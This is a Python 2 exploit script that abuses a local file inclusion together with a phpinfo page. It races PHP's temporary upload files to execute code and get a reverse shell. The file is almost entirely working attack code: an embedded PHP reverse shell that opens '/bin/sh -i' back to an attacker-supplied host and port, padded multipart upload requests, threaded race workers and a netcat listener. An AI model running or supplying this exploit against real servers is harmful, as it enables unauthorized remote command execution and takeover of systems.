#!/usr/bin/python2
#  -*- coding: utf-8 -*- #######################################################################################
#█ ▄▄   ▄  █ █ ▄▄  ▄█    ▄   ▄████  ████▄ █    ▄████  ▄█                                                       #
#█   █ █   █ █   █ ██     █  █▀   ▀ █   █ █    █▀   ▀ ██                                                       #
#█▀▀▀  ██▀▀█ █▀▀▀  ██ ██   █ █▀▀    █   █ █    █▀▀    ██                                                       #
#█     █   █ █     ▐█ █ █  █ █      ▀████ ███▄ █      ▐█                                                       #
#█       █   █     ▐ █  █ █  █               ▀ █      ▐                                                        #
#▀     ▀     ▀      █   ██   ▀                 ▀                                                               #
# phpinfo_lfi - nighter                                                                                        #
#                                                                                                              #
# DATE                                                                                                         #
# 20/05/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# PHP store temporary uploaded files during processing. A race condition is possible if you abuse a lfi        #
# to get a reverse_tcp                                                                                         #
#                                                                                                              #
# This is just rewrite of phpinfolfi.py to make it simpiler to use                                             #
# Reference: https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf          #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import sys
import threading
import socket
import os

def setup(host, port):

    global URL
    global LFI
    global LHOST
    global LPORT
    global THREADS
    global PHPINFO

    TAG = 'Security Test'
    PAYLOAD="""Security Test\r<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '"""+LHOST+""""';
$port = """+str(LPORT)+""";
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {

	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>\r"""
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    #REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
    REQ1="""POST /"""+PHPINFO+"""?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    #modify this to suit the LFI script
    LFIREQ = """GET /""" + LFI + """%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, int(port)))
    s2.connect((host, int(port)))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:

        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()

            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256


if __name__ == "__main__":

    if len(sys.argv) < 5:
        print("""
█ ▄▄   ▄  █ █ ▄▄  ▄█    ▄   ▄████  ████▄ █    ▄████  ▄█ 
█   █ █   █ █   █ ██     █  █▀   ▀ █   █ █    █▀   ▀ ██ 
█▀▀▀  ██▀▀█ █▀▀▀  ██ ██   █ █▀▀    █   █ █    █▀▀    ██ 
█     █   █ █     ▐█ █ █  █ █      ▀████ ███▄ █      ▐█ 
 █       █   █     ▐ █  █ █  █               ▀ █      ▐ 
  ▀     ▀     ▀      █   ██   ▀                 ▀       
                                                                                         
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LFI> <LHOST> <LPORT> [threads]" % (sys.argv[0]))
        print("\nEXAMPLE: ./phpinfo_lfi.py 'http://127.0.0.1:8080/phpinfo.php' 'index.php?file=' 10.10.14.24 1337 300\n")
        sys.exit(0)

    URL = sys.argv[1]
    LFI = sys.argv[2]
    LHOST = sys.argv[3]
    LPORT = sys.argv[4]

    try:
        THREADS = sys.argv[5]
    except:
        THREADS = 30

    if ':' in URL:
        host = str(URL.split('/')[2]).split(':')[0]
        port = str(URL.split(':')[2]).split('/')[0]
    else:
        host = str(URL.split('/')[2])
        port = 80

    try:
        PHPINFO = URL.split('/')[3]
    except:
        PHPINFO = 'phpinfo.php'

    try:
        host = socket.gethostbyname(host)
    except socket.error, e:
        print "Error with hostname %s: %s" % (host, e)
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(THREADS)
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (THREADS, e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        print "[+] Netcat port: %s" % LPORT
        os.system('nc -lnvp %s' % LPORT)

        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

